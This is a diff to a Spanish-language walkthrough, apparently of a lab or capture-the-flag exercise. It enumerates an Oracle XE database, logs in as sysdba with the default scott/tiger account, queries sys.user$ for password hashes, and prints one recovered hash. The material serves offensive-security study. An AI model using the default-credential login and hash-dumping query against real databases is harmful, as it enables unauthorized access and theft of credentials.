@@ -1199,6 +1199,7 @@ Comenzamos la enumeración, listamos las tablas:
 ```sql
 select table_name from all_tables
 ```
+<img width="420" height="909" alt="image" src="https://github.com/user-attachments/assets/067af73d-9478-4898-a49b-dd69963512f6" />
 
 Vemos los roles asignados al usuario actual:
 ```sql
@@ -1206,8 +1207,25 @@ select * from user_role_privs;
 ```
 <img width="643" height="121" alt="image" src="https://github.com/user-attachments/assets/156e8e3b-05c2-4a9d-8364-f9d0d2bc7f7e" />
 
-<img width="420" height="909" alt="image" src="https://github.com/user-attachments/assets/067af73d-9478-4898-a49b-dd69963512f6" />
+- SCOTT tiene roles típicos para trabajar (CONNECT/RESOURCE).
+- No parece admin.
 
+Intentamos conectarnos como `sysdba`:
+```sql
+sqlplus scott/tiger@<ip>/XE as sysdba
+```
 
-SCOTT tiene roles típicos para trabajar (CONNECT/RESOURCE).
-No parece admin.
+Vemos que pudimos conectarnos como sysdba y listamos todos los permisos que tenemos:
+<img width="718" height="944" alt="image" src="https://github.com/user-attachments/assets/073779e3-31a3-4d45-be86-b39f2cadbdb1" />
+
+Listamos información de los usuarios para obtener los hashes de las contraseñas:
+```sql
+select name, password from sys.user$;
+```
+
+<img width="605" height="949" alt="image" src="https://github.com/user-attachments/assets/97f186b2-8ede-425d-bcc7-e9b38ea8f546" />
+
+Obtenemos el hash:
+```
+E066D214D5421CCC
+```
